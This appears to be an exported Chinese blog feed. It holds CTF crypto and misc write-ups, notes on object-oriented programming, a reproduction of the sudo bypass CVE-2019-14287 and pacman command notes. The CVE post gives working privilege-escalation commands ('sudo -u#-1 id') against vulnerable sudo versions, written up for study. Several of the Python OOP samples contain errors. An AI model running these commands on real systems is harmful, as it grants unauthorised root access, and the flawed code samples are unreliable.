123456789101112131415已知椭圆曲线加密Ep(a,b)参数为p = 15424654874903a = 16546484b = 4548674875G(6478678675,5636379357093)私钥为k = 546768求公钥K(x,y) 又因为题目说工具，了解其算法后，便找到了一个python的脚本计算公钥 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164import collectionsimport randomEllipticCurve = collections.namedtuple('EllipticCurve', 'name p a b g n h')curve = EllipticCurve( 'secp256k1', # Field characteristic. p=int(input('p=')), # Curve coefficients. a=int(input('a=')), b=int(input('b=')), # Base point. g=(int(input('Gx=')), int(input('Gy='))), # Subgroup order. n=int(input('k=')), # Subgroup cofactor. h=1,)# Modular arithmetic ##########################################################def inverse_mod(k, p): """Returns the inverse of k modulo p. This function returns the only integer x such that (x * k) % p == 1. k must be non-zero and p must be a prime. """ if k == 0: raise ZeroDivisionError('division by zero') if k &lt; 0: # k ** -1 = p - (-k) ** -1 (mod p) return p - inverse_mod(-k, p) # Extended Euclidean algorithm. s, old_s = 0, 1 t, old_t = 1, 0 r, old_r = p, k while r != 0: quotient = old_r // r old_r, r = r, old_r - quotient * r old_s, s = s, old_s - quotient * s old_t, t = t, old_t - quotient * t gcd, x, y = old_r, old_s, old_t assert gcd == 1 assert (k * x) % p == 1 return x % p# Functions that work on curve points #########################################def is_on_curve(point): """Returns True if the given point lies on the elliptic curve.""" if point is None: # None represents the point at infinity. return True x, y = point return (y * y - x * x * x - curve.a * x - curve.b) % curve.p == 0def point_neg(point): """Returns -point.""" assert is_on_curve(point) if point is None: # -0 = 0 return None x, y = point result = (x, -y % curve.p) assert is_on_curve(result) return resultdef point_add(point1, point2): """Returns the result of point1 + point2 according to the group law.""" assert is_on_curve(point1) assert is_on_curve(point2) if point1 is None: # 0 + point2 = point2 return point2 if point2 is None: # point1 + 0 = point1 return point1 x1, y1 = point1 x2, y2 = point2 if x1 == x2 and y1 != y2: # point1 + (-point1) = 0 return None if x1 == x2: # This is the case point1 == point2. m = (3 * x1 * x1 + curve.a) * inverse_mod(2 * y1, curve.p) else: # This is the case point1 != point2. m = (y1 - y2) * inverse_mod(x1 - x2, curve.p) x3 = m * m - x1 - x2 y3 = y1 + m * (x3 - x1) result = (x3 % curve.p, -y3 % curve.p) assert is_on_curve(result) return resultdef scalar_mult(k, point): """Returns k * point computed using the double and point_add algorithm.""" assert is_on_curve(point) if k &lt; 0: # k * point = -k * (-point) return scalar_mult(-k, point_neg(point)) result = None addend = point while k: if k &amp; 1: # Add. result = point_add(result, addend) # Double. addend = point_add(addend, addend) k &gt;&gt;= 1 assert is_on_curve(result) return result# Keypair generation and ECDHE ################################################def make_keypair(): """Generates a random private-public key pair.""" private_key = curve.n public_key = scalar_mult(private_key, curve.g) return private_key, public_keyprivate_key, public_key = make_keypair()print("private key:", hex(private_key))print("public key: (0x&#123;:x&#125;, 0x&#123;:x&#125;)".format(*public_key)) 1234567891011121314$python ecc_calKey.pyp=15424654874903a=16546484b=4548674875Gx=6478678675Gy=5636379357093k=546768private key: 0x857d0public key: (0xcb19fe553fa, 0x50545408eb4)$python&gt;&gt;&gt; 0x50545408eb4+0xcb19fe553fa19477226185390&gt;&gt;&gt;]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF-adworld-misc-wp]]></title>
    <url>%2F2019%2F11%2F08%2FXCTF-adworld-misc-wp%2F</url>
    <content type="text"><![CDATA[Misc&amp;WriteUpmsic永远充满了惊喜 攻防世界&amp;Misc新手练习区0x01 this_is_flag 题目描述： Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9} 易知flag为：flag{th1s_!s_a_d4m0_4la9} 0x02 ext3 题目描述： 今天是菜狗的生日，他收到了一个linux系统光盘 下载附件得到一个19.5MB的文件，由于题目是ext3，所以联想到将该文件挂载至linux下 运行mount test /mnt/,然后发现下面有一堆文件 执行find |grep flag，得到./O7avZhikgKgbF/flag.txt 用cat命令查看文件，得到一串字符ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0= 明显的base64编码，转码得到flag：flag{sajbcibzskjjcnbhsbvcjbjszcszbkzj} 但是看官方wp，发现是另外一种做法。 不知道为啥判断附件为img格式，然后用winhex打开该文件搜索flag得到如下 然后解压该文件（我用bandzip没有打开，改后缀为img装载显示光盘映像已损坏），搜索得到flag.txt，然后其他步骤相同 0x03 give_you_flag 题目描述：菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包 下载附件，发现是一个gif文件，打开查看发现在最后几秒闪过一个二维码 第一次做傻傻地用了linux下convert命令，将gif转到png，发现50多帧都被拆分成一个个png， 二维码大概在49帧，后面才发现有Stegsolve可以查看图片的每一帧 明显是个二维码，修补其三角定位，得到下图 扫码得到flag：flag{e7d478cf6b915f50ab1277f78502a2c5} 0x04 pdf 题目描述：菜猫给了菜狗一张图，说图下面什么都没有 打开附件是一个pdf，里面是一张图片，推测将pdf转为word格式之后，移走图片，发现flag就在图片底下 易知得到flag：flag{security_through_obscurity} 0x05 stegano 题目描述：菜狗收到了图后很开心，玩起了pdf 提交格式为flag{xxx}，解密字符需小写 打开附件发现一份文档 一开始没有思路，就先用之前的convert命令，将pdf的东西全部复制出来查看，发现 将AB转换为. - 可得到如下 12-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...-- 解摩斯密码得到：CONGRATULATIONSFLAG1NV151BL3M3554G3 flag为：flag{1NV151BL3M3554G3} 0x06 SimpleRAR 题目描述：菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层) 下载完附件，只有一个文件，打开flag.txt ,里面写着flag is not here 打开winhex查看该rar，发现里面还有一个secret.png，然后根据文件头（或者使用rar修复） 将A8 3C 7A 修改为 A8 3C 74 。 然后解压得到secret.png，打开是一个空白图片，便想到用winhex查看。 发现文件头是GIF，将后缀改为.gif，然后用Stegsolve分离出两帧图片，分别是二维码的上下部分，还少定位符，补齐定位符，扫码得到flag：flag：flag{yanji4n_bu_we1shi} 0x07 坚持60s 题目描述：菜狗发现最近菜猫不爱理他，反而迷上了菜鸡 下下来是一个jar包，用java运行，发现是一个小游戏，根据题目联想需要坚持60s。 玩了几次之后手残放弃，然后解压缩文件，用winhex打开文件搜索flag，在/cn/bjsxt/plane/PlaneGameFrame.class里找到 flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}易知是base64编码，base64decode得到flag{DajiDali_JinwanChiji} 第二种办法，我在找到flag后思考这是misc题也不是逆向题，便觉得这游戏肯定有bug，然后根据常识发现右边和下面的边界可以穿过来躲避障碍，但是完全卡入右边界之后无法返回。 之后发现到下边只能卡入一半，于是突发思维，将小方块卡入右下角然后留下了一个小角，发现可以成功躲过60s（记得计时，在60s~70s时主动出去死亡即可，然后成功得到flag明文 0x08 gif 题目描述：菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机 得到一个zip包，查看里面有103张黑白色的图片，联想到二进制。 白色图片代表0，黑色图片代表1。 01100110前八位二进制换算后为 f 证明思路正确。 01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101 二进制转字符串得到 flag：flag{FuN_giF} 0x09 掀桌子 题目描述：菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻ 题目只有描述中这一段字符串有信息，推测是十六进制，写python的转换代码 每两个一组，将16进制转换为10进制，减去128以后输出 ascii。 得到Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr 0x0a 如来十三掌 题目描述：菜狗为了打败菜猫，学了一套如来十三掌。 下下来附件是一个docx，发现是一段文字，贼像佛教里的文字 搜索得到这是一种佛语加密，在网站 http://keyfc.net/bbs/tools/tudoucode.aspx 与佛论禅 可以翻译，但是将全文复制到chrome和firefox打开的网站里都解码失败了，后看他的说明，推测应该在复制过程中会将繁体字转换为简体字，这样你复制后的文字已经不是最初的原文了，所以解不出。试验过在MicrosoftEdge中能够成功解码。 解完是一串像base64编码的字符MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9，但是该字符解码得到是一串乱码，然后发现这个字符串需要先用rot13（与题目“如来十三掌”谐音）转一下，然后再base64解码，得到flag。 0x0b base64stego 题目描述：菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓 打开压缩包，压缩包是伪加密的根据ctf-wiki里直接用winhex改一个标志位，或者用winrar修复即可 是一个stego.txt可以看到很多行的base64编码 解码出来是在wiki百科上对Steganography的解释 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129Steganography is the art and science of writing hidden messages in such a way that no one, apart from the sender and intended recipient, suspects the existence of the message, a form of security through obscurity. The word steganography is of Greek origin and means "concealed writing" from the Greek words steganos meaning "covered or protected", and graphein meaning "to write". The first recorded use of the term was in 1499 by Johannes Trithemius in his Steganographia, a treatise on cryptography and steganography disguised as a book on magic. Generally, messages will appear to be something else: images, articles, shopping lists, or some other covertext and, classically, the hidden message may be in invisible ink between the visible lines of a private letter.The advantage of steganography, over cryptography alone, is that messages do not attract attention to themselves. Plainly visible encrypted messages�no matter how unbreakable�will arouse suspicion, and may in themselves be incriminating in countries where encryption is illegal. Therefore, whereas cryptography protects the contents of a message, steganography can be said to protect both messages and communicating parties.Steganography includes the concealment of information within computer files. In digital steganography, electronic communications may include steganographic coding inside of a transport layer, such as a document file, image file, program or protocol. Media files are ideal for steganographic transmission because of their large size. As a simple example, a sender might start with an innocuous image file and adjust the color of every 100th pixel to correspond to a letter in the alphabet, a change so subtle that someone not specifically looking for it is unlikely to notice it.The first recorded uses of steganography can be traced back to 440 BC when Herodotus mentions two examples of steganography in The Histories of Herodotus. Demaratus sent a warning about a forthcoming attack to Greece by writing it directly on the wooden backing of a wax tablet before applying its beeswax surface. Wax tablets were in common use then as reusable writing surfaces, sometimes used for shorthand. Another ancient example is that of Histiaeus, who shaved the head of his most trusted slave and tattooed a message on it. After his hair had grown the message was hidden. The purpose was to instigate a revolt against the Persians.Steganography has been widely used, including in recent historical times and the present day. Possible permutations are endless and known examples include:* Hidden messages within wax tablets: in ancient Greece, people wrote messages on the wood, then covered it with wax upon which an innocent covering message was written.* Hidden messages on messenger's body: also used in ancient Greece. Herodotus tells the story of a message tattooed on a slave's shaved head, hidden by the growth of his hair, and exposed by shaving his head again. The message allegedly carried a warning to Greece about Persian invasion plans. This method has obvious drawbacks, such as delayed transmission while waiting for the slave's hair to grow, and the restrictions on the number and size of messages that can be encoded on one person's scalp.* In WWII, the French Resistance sent some messages written on the backs of couriers using invisible ink.* Hidden messages on paper written in secret inks, under other messages or on the blank parts of other messages.* Messages written in Morse code on knitting yarn and then knitted into a piece of clothing worn by a courier.* Messages written on the back of postage stamps.* During and after World War II, espionage agents used photographically produced microdots to send information back and forth. Microdots were typically minute, approximately less than the size of the period produced by a typewriter. WWII microdots needed to be embedded in the paper and covered with an adhesive (such as collodion). This was reflective and thus detectable by viewing against glancing light. Alternative techniques included inserting microdots into slits cut into the edge of post cards.* During World War II, a spy for Japan in New York City, Velvalee Dickinson, sent information to accommodation addresses in neutral South America. She was a dealer in dolls, and her letters discussed how many of this or that doll to ship. The stegotext was the doll orders, while the concealed "plaintext" was itself encoded and gave information about ship movements, etc. Her case became somewhat famous and she became known as the Doll Woman.* Cold War counter-propaganda. In 1968, crew members of the USS Pueblo (AGER-2) intelligence ship held as prisoners by North Korea, communicated in sign language during staged photo opportunities, informing the United States they were not defectors but rather were being held captive by the North Koreans. In other photos presented to the US, crew members gave "the finger" to the unsuspecting North Koreans, in an attempt to discredit photos that showed them smiling and comfortable.--http://en.wikipedia.org/wiki/Steganography 推测是base64隐写，跑脚本得到flag：flag{Base_sixty_four_point_five} 1234567891011121314151617181920import base64import sysdef deStego(stegoFile): b64table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" with open(stegoFile,'r') as stegoText: message = "" for line in stegoText: try: text = line[line.index("=") - 1:-1] message += "".join([ bin( 0 if i == '=' else b64table.find(i))[2:].zfill(6) for i in text])[2 if text.count('=') ==2 else 4:6] except: pass return "".join([chr(int(message[i:i+8],2)) for i in range(0,len(message),8)])if __name__ == "__main__": if len(sys.argv) == 2: print(deStego(sys.argv[1])) else: print(deStego("stego.txt")) 0x0c 功夫再高也怕菜刀 题目描述：菜狗决定用菜刀和菜鸡决一死战 下载附件发现是一个.pcapng文件，是一个wireshark流量包。 用wireshark打开，ctrl+F查找flag 发现里面有zip和flag.txt还有6666.jpg。 追踪6666.jpg那一行的TCP请求，右键追踪TCP流 由于图片JPG的文件头是FFD8文件尾是FFD9，将文件另存为 ，然后用文本编辑器，编辑导出的文件，查找并删除第一个jpg文件头（FFD8）和最后一个文件尾（FFD9）之外的字符串，剩下的全是十六进制字符串。然后把十六进制保存为图片，我用的“010 Editor”，打开后新建空白文件，复制图片十六进制字符串到粘贴板，点击菜单栏“Edit-Paste From-Paste From Hex Text”，然后保存为图片就行了，保存后的图片如下图。 刚才看到里面有存在一个hello.zip，便用foremost处理流量包，分理出一个压缩文件，里面就是flag.txt，为加密文件，联想至刚刚那张复原的图片，用密码Th1s_1s_p4sswd_!!!尝试打开文件，得到flag：flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Object-oriented Programming]]></title>
    <url>%2F2019%2F10%2F21%2FObject-oriented-Programming%2F</url>
    <content type="text"><![CDATA[虽然一直再写面向对象编程的语言，但是压根没有对象可以面对，希望写完这篇能有对象可以让我面对！！！ 简介 面向对象编程(Object-oriented Programming,缩写：OOP)是软件工程中一种具有对象概念的编程范式(Programming Paradigm)，同时也是一种程序开发的抽象方针，与之对应的编程范式还有：函数式编程(Functional Programming)、过程式编程(Procedural Programming)、响应式编程(Reactive Programming)等。 面向对象的程序设计（OOP）是面向过程程序设计的继承和发展，它不仅汲取了后者的精华，而且以一种更加接近人类思维的方式来分析和解决问题：程序是对现实世界的抽象和描述，现实世界的基本单元是物体，与之对应的，程序中的基本单元是对象。 面向对象思想认为：现实世界是由对象组成的，无论大到一个国家还是小到一个原子，都是如此。并且对象都由两部分组成： 描述对象状态或属性的数据（变量）以及描述对象行为或者功能的方法（函数）。并且与面向过程不同，面向对象是将数据和操作数据的函数紧密结合，共同构成对象来更加精确地描述现实世界，这是面向过程和面向对象两者最本质的区别。 对象与类在面向对象编程中，最常见的表现就是基于类(Class)来表现的，每一个对象实例都有具体的类，即对象的类型。使用类的面向对象编程也称为基于类的编程(Class-based programming)，如常见的Java，C++；而与之类似的有基于原型的编程(Prototype-based programming)，如JavaScript。 类：定义对象的数据格式(属性类型)和可用过程(方法)，同时也可能包含类成员的数据(如，常量)和过程(如，静态方法)，类其实就是对象的类型/原型(prototype)。 对象：类的实例，通过类实例化出来的具体实例。 面向对象的三大特征 面向对象的三大特征分别是：封装、继承、多态 。 封装(Encapsulation) 通过对象隐藏程序的具体实现细节，将数据与操作包装在一起，对象与对象之间通过消息传递机制实现互相通信（方法调用），具体的表现就是通过提供访问接口实现消息的传入传出。 封装常常会通过控制访问权限来控制对象之间的互访权限，常见的访问权限：公有(public)，私有(private)，保护(protected)。某些语言可能还会提供更加具体的访问控制，如，Java的package。 封装的意义：由于封装隐藏了具体的实现，如果实现的改变或升级对于使用方而言是无感知的，提高程序的可维护性；而且封装鼓励程序员把特定数据与对数据操作的功能打包在一起，有利于应用程序的去耦。 继承(Inheritance) 支持类的语言基本都支持继承，继承即类之间可以继承，通过继承得到的类称为子类，被继承的类为父类，子类相对于父类更加具体化。 子类具有自己特有的属性和方法，并且子类使用父类的方法也可以覆盖(重写)父类方法，在某些语言中还支持多继承，但是也带来了覆盖的复杂性。 继承的意义：继承是代码复用的基础机制 多态(Polymorphism) 多态发生在运行期间，即子类型多态，指的是子类型是一种多态的形式，不同类型的对象实体有统一接口，相同的消息给予不同的对象会引发不同的动作。 多态的意义：提供了编程的灵活性，简化了类层次结构外部的代码，使编程更加注重关注点分离(Separation of concerns，SoC) 关于面向对象编程的设计模式，可以参考谈谈面向对象编程 Python3面向对象编程 参考： 一文看懂Python面向对象编程核心思想(Python学习与Django入门必看) Python3 面向对象 Python面向对象编程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/python3class people: #默认为公有变量4name = "" age = 0 #定义私有变量，即在变量前加入 __ __weight = 0 num = 0 #类专有方法，可重写 def __init__(self,n,a,w): self.name = n self.age = a self.__weight = w self.num += 1 #类方法一般第一个参数为self def speak(self): print('I am %s,and I am %d years old' % (self.name,self.age)) @classmethod def tol(cls): print("total numble of people is &#123;&#125;".format(self.num)) #这个为类方法，可直接使用people.tol() #student 继承people类class student(people): grade = "" def __init__(self,n,a,w,g): people.__init__(self,n,a,w) self.grade = g4#方法重写 def speak(self): print("I am a %s student.\nMy name is %s" % (self.grade,self.name)) #类的私有方法 def __show_detail(self): print(self.name+"\t"+self.age+"\t"+self.__weight+"\n"+self.grade) #封装 def getWeight(self): return self.weight #python有多重继承class sample(people, student): tag = "" def __init__(self,n,a,w,g,t): people.__init__(self,n,a,w) student.__init__(self,g=g) tag = t s1 = student("Alice",16,47,"7th grades") python提供类的转有方法，可进行方法重写 1234567891011121314151617181920212223242526272829303132__init__ : 构造函数，在生成对象时调用__del__ : 析构函数，释放对象时使用__repr__ : 打印，转换__setitem__ : 按照索引赋值__getitem__: 按照索引获取值__len__: 获得长度__cmp__: 比较运算__call__: 函数调用__add__: 加运算__sub__: 减运算__mul__: 乘运算__truediv__: 除运算__mod__: 求余运算__pow__: 乘方反向运算符重载： __radd__: 加运算__rsub__: 减运算__rmul__: 乘运算__rdiv__: 除运算__rmod__: 求余运算__rpow__: 乘方 复合重载运算符__iadd__: 加运算__isub__: 减运算__imul__: 乘运算__idiv__: 除运算__imod__: 求余运算__ipow__: 乘方 注：__new__()方法python中定义的类在创建实例对象的时候，会自动执行init()方法，但是在执行init()方法之前，会执行new()方法。 new()的作用主要有两个。 1.在内存中为对象分配空间2.返回对象的引用。（即对象的内存地址） python解释器在获得引用的时候会将其传递给init()方法中的self。 12345678class A: def __new__(cls,*args,**kwargs): print('__new__') return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行 def __init__(self):#这里的self就是new方法中的return返回值 print('__init__')a = A() 输出结果 12__new____init__ 我们一定要在new方法中最后调用 1return super().__new__(cls) 否则init方法不会被调用 123456789class A: def __new__(cls,*args,**kwargs): print('__new__') # return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行 def __init__(self):#这里的self就是new方法中的return返回值 print('__init__')a = A() 输出 1__new__ 像以前一样，我们不写new方法试试 123456789class A: # def __new__(cls,*args,**kwargs): # print('__new__') # return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行 def __init__(self):#这里的self就是new方法中的return返回值 print('__init__')a = A() 输出 1__init__ 私有属性-封装在实际开发中，对象 的 某些属性或方法 可能只希望 在对象的内部被使用，而 不希望在外部被访问到 定义方式 在 定义属性或方法时，在 属性名或者方法名前 增加 两个下划线__ 实际开发中私有属性也不是一层不变的。所以要给私有属性提供外部能够操作的方法。 7.1) 通过自定义get set方法提供私有属性的访问 12345678910111213141516class Person: def __init__(self, name, age): self.name = name self.__age = age #定义对私有属性的get方法，获取私有属性 def getAge(self): return self.__age #定义对私有属性的重新赋值的set方法，重置私有属性 def setAge(self,age): self.__age = ageperson1 = Person("tom",19)person1.setAge(20)print(person1.name,person1.getAge()) #tom 20 7.2) 调用property方法提供私有属性的访问 12345678910111213141516171819class Student: def __init__(self, name, age): self.name = name self.__age = age #定义对私有属性的get方法，获取私有属性 def getAge(self): return self.__age #定义对私有属性的重新赋值的set方法，重置私有属性 def setAge(self,age): self.__age = age p = property(getAge,setAge) #注意里面getAge,setAge不能带()s1 = Student("jack",22)s1.p = 23 #如果使用=,则会判断为赋值，调用setAge方法。print(s1.name,s1.p) #jack 23 ，直接使用s1.p会自动判断会取值，调用getAgeprint(s1.name,s1.getAge()) #jack 23,这个时候set,get方法可以单独使用。 7.3) 使用property标注提供私有属性的访问 注意： 一旦给函数加上一个装饰器@property,调用函数的时候不用加括号就可以直接调用函数了 12345678910111213141516171819202122232425262728293031class Teacher: def __init__(self, name, age,speak): self.name = name self.__age = age self.__speak = speak @property #注意1.@proterty下面默认跟的是get方法，如果设置成set会报错。 def age(self): return self.__age @age.setter #注意2.这里是使用的上面函数名.setter，不是property.setter. def age(self,age): if age &gt; 150 and age &lt;=0: #还可以在setter方法里增加判断条件 print("年龄输入有误") else: self.__age = age @property def for_speak(self): #注意2.这个同名函数名可以自定义名称，一般都是默认使用属性名。 return self.__speak @for_speak.setter def for_speak(self, speak): self.__speak = speakt1 = Teacher("herry",45,"Chinese")t1.age = 38 #注意4.有了property后，直接使用t1.age,而不是t1.age()方法了。t1.for_speak = "English" print(t1.name,t1.age,t1.for_speak) #herry 38 English C++面向对象编程 引用： c++面向对象程序设计总结(类的使用) C++ 类 &amp; 对象 C++面向对象基础 析构函数析构函是类的一个成员函数，名字由波浪号接类名构成。它没有返回值，也不接受参数： 12345class Foo&#123; public: ~Foo(); //析构函数 //... &#125;; 由于析构函数不接受参数，因此它不能被重载。对于一个给定类，只会由唯一一个析构函数。 在一个构造函数中，成员的初始化时在函数体执行之前完成的，且按照它们在类中出现的顺序进行初始化。在一个析构函数中，首先执行函数体，然后销毁成员。成员按初始化顺序的逆序进行销毁。 无论何时一个对象被销毁，就会自动调用其析构函数： ​ 1.变量在离开其作用域时被销毁​ 2.当一个对象被销毁时，其成员被销毁​ 3.容器(无论是标准容器还是数组)被销毁时，其元素被销毁​ 4.对于动态分配的对象，当对指向它的指针应用delete运算符时被销毁​ 5.对于临时对象，当创建它的完整表达式结束时被销毁 未完待续]]></content>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-14287]]></title>
    <url>%2F2019%2F10%2F18%2FCVE-2019-14287%2F</url>
    <content type="text"><![CDATA[引用： Potential bypass of Runas user restrictions (sudo official page) CVE-2019-14287：sudo权限绕过漏洞分析与复现 Linux Sudo暴userID提权漏洞CVE-2019-14287 sudo 用法简介 第一次复现CVE漏洞，十分滴激动 概述Sudo 的全称是“superuserdo”，它是Linux系统管理指令，允许用户在不需要切换环境的前提下以其它用户的权限运行应用程序或命令。通常以 root 用户身份运行命令，是为了减少 root 用户的登录和管理时间，同时提高安全性。 2019年10月14日，Sudo官方发布了Sudo 1.8.28版本，其中包含sudo root权限绕过漏洞（CVE-2019-14287）的补丁修复。 利用前提 sudo -v &lt; 1.8.28 知道当前用户的密码 当前用户存在于sudo权限列表 漏洞复现复现是在sudo 1.8.16的版本下进行的，对于低于1.8.28的版本都起作用 1test ALL=(ALL,!root) /usr/bin/id 其中，在sudoers配置中，以上语句代表着test用户，ALL=(ALL,!root)代表指定用户，即所有除root以外的用户都可运行命令/usr/bin/id 一般情况下，大多数Linux发行版的Runas规范（/etc /sudoers）都如下图（第三张图）所示，其中定义的ALL关键字将允许admin或sudo组中的用户以目标系统中的任意用户身份来运行命令 如果想利用该漏洞来实施攻击，用户需要拥有sudo权限，并允许用户使用任意用户ID来运行命令（如下图中定义了test用户可用id命令，但不能以root用户执行命令id（test ALL=(ALL,!root) /usr/bin/id））。通常来说，这意味着用户的sudoer项在Runas规范中定义了特殊的ALL值。如果sudoer策略允许的话，sudo支持由用户指定的用户名或用户ID来运行命令。 如果sudoer条目允许用户以任意用户身份运行命令（非root），那么攻击者就可以利用该漏洞来绕过这种限制了。 12sudo -u#-1 idsudo -u#4294967295 id 上述命令运行之后，将返回“0”。这是因为sudo命令本身已经在以用户ID“0”运行了，所以当sudo尝试将用户ID修改为“-1”时，不会发生任何变化。 但是，sudo日志条目中记录下的命令运行用户的ID为“4294967295”，而并非root用户（或用户ID为“0”），除此之外，因为用户ID是通过-u选项指定的，并且不会在密码数据库中存储，所以PAM会话模块也不会运行。 漏洞片段 漏洞CVE-2019-14287的源于sudo调用的系统函数setresuid()和setreuid()在参数处理中会将 -1（或其等效的无符号整数4294967295）误认为是 0，而这正好是 root 用户的UserID 。 实际上，只要用户的权限足够高，即拥有最高sudo权限的用户，并且在Runas规范中定义了ALL关键字的话，他们就可以运行Runas规范中明确禁止使用的那些root命令，而且以这种方式运行的命令其日志项所显示的目标用户为4294967295，而不是root。与此同时，在执行相应命令的过程中，PAM会话模块将不会运行。]]></content>
      <categories>
        <category>CVE</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pacman]]></title>
    <url>%2F2019%2F10%2F11%2Fpacman%2F</url>
    <content type="text"><![CDATA[包管理工具 Pacman 参考： Pacman Home Page pacman wiki](https://wiki.archlinux.org/index.php/Pacman_(简体中文)) ArchLinux 的 pacman 命令详解 警告: 在Arch下安装软件包时，未更新#升级软件包)系统前，不要更新软件包数据库（例如，可能出现某软件包不再出现在官方库）。操作时，应使用pacman -Syu *package_name*, 而不要使用（pacman -Sy *package_name*），否则可能会有依赖问题。参见 System maintenance (简体中文)#不支持部分升级#不支持部分升级) 和 BBS#89328. 安装指定的包安装或者升级单个软件包，或者一列软件包（包含依赖包），使用如下命令： 1$ pacman -S package_name1 package_name2 ... 用正则表达式安装多个软件包（参见 pacman 小贴士#巧用Bash语法): invalid section]和这个帖子）： 1$ pacman -S $(pacman -Ssq package_regex) 有时候在不同的软件仓库中，一个软件包有多个版本（比如[extra]和[testing]）。可以选择一个来安装： 1$ pacman -S extra/package_name 安装多个含有相似名称的软件包，而并非整个包组或全部匹配的软件包； 例如，plasma: 1$ pacman -S plasma-&#123;desktop,mediacenter,nm&#125; 当然，可以多层扩展，并不作限制： 1$ pacman -S plasma-&#123;workspace&#123;,-wallpapers&#125;,pa&#125; 安装包组一些包属于一个可以同时安装的软件包组。例如，运行下面的命令 1$ pacman -S gnome 会提醒用户选择 gnome 内需要安装的包。 有的包组包含大量的软件包，有时用户只需其中几个。除了逐一键入序号外，pacman 还支持选择或排除某个区间内的的软件包： 1Enter a selection (default=all): 1-10 15 这将选中序号 1 至 10 和 15 的软件包。而 1Enter a selection (default=all): ^5-8 ^2 将会选中除了序号 5 至 8 和 2 之外的所有软件包。 想要查看哪些包属于 gnome 组，运行： 1$ pacman -Sg gnome 也可以访问 https://www.archlinux.org/groups/ 查看可用的包组。 注意: 如果列表中的包已经安装在系统中，它会被重新安装，即使它已经是最新的。可以用 --needed 选项覆盖这种行为。 删除软件包删除单个软件包，保留其全部已经安装的依赖关系 1$ pacman -R package_name 删除指定软件包，及其所有没有被其他已安装软件包使用的依赖关系： 1$ pacman -Rs package_name 要删除软件包和所有依赖这个软件包的程序: 警告: 此操作是递归的，请小心检查，可能会一次删除大量的软件包。 1$ pacman -Rsc package_name 要删除软件包，但是不删除依赖这个软件包的其他程序： 1$ pacman -Rdd package_name pacman 删除某些程序时会备份重要配置文件，在其后面加上*.pacsave扩展名。-n 选项可以避免备份这些文件： 1$ pacman -Rn package_name 注意: pacman 不会删除软件自己创建的文件(例如主目录中的 .dot 文件不会被删除。 升级软件包 警告: * 建议所有用户都经常性的更新系统 Arch 只支持系统完整升级，详细参见不支持部分升级和#安装软件包#安装软件包)。 一个 pacman 命令就可以升级整个系统。花费的时间取决于系统有多老。这个命令会同步非本地(local)软件仓库并升级系统的软件包： 1$ pacman -Syu 查询包数据库pacman 使用 -Q 参数查询本地软件包数据库。参见： 1$ pacman -Q --help 使用 -S 参数来查询远程同步的数据库。参见： 1$ pacman -S --help pacman 可以在包数据库中查询软件包，查询位置包含了软件包的名字和描述： 1$ pacman -Ss string1 string2 ... 有时，-s的内置正则会匹配很多不需要的结果，所以应当指定仅搜索包名，而非描述或其他子段，下面的命令就会返回很多不必要结果: 1$ pacman -Ss '^vim-' 要查询已安装的软件包： 1$ pacman -Qs string1 string2 ... 按文件名查找软件库： 1$ pacman -Fs string1 string2 ... 显示软件包的详尽的信息： 1$ pacman -Si package_name 查询本地安装包的详细信息： 1$ pacman -Qi package_name 使用两个 -i 将同时显示备份文件和修改状态： 1$ pacman -Qii package_name 要获取已安装软件包所包含文件的列表： 1$ pacman -Ql package_name 查询远程库中软件包包含的文件： 1$ pacman -Fl package_name 检查软件包安装的文件是否都存在： 1$ pacman -Qk package_name 两个参数k将会执行一次更彻底的检查。 查询数据库获取某个文件属于哪个软件包： 1$ pacman -Qo /path/to/file_name 查询文件属于远程数据库中的哪个软件包： 1$ pacman -Fo /path/to/file_name 要罗列所有不再作为依赖的软件包(孤立orphans)： 1$ pacman -Qdt 要罗列所有明确安装而且不被其它包依赖的软件包： 1$ pacman -Qet 要显示软件包的依赖树： 1$ pactree package_name 检查一个安装的软件包被那些包依赖，可以使用 pkgtoolsAUR中的whoneeds: 1$ whoneeds package_name 或者pactree中使用-r: 1$ pactree -r package_name 数据库结构pacman数据库通常位于 /var/lib/pacman/sync. 